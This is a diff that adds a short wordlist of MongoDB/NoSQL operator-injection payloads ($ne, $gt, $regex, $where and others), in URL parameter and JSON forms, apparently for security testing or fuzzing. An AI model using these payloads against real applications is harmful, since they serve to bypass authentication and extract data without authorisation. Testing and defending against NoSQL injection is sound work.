@@ -1,0 +1,14 @@
+# NoSQL - MongoDB Operator Payloads
+[$ne]=1
+[$gt]=
+[$gte]=
+[$lt]=z
+[$nin][]=admin
+[$regex]=.*
+[$where]=1==1
+[$exists]=true
+{"$gt": ""}
+{"$ne": null}
+{"$regex": ".*"}
+{"$where": "1==1"}
+{"$gt": "", "$lt": "z"}
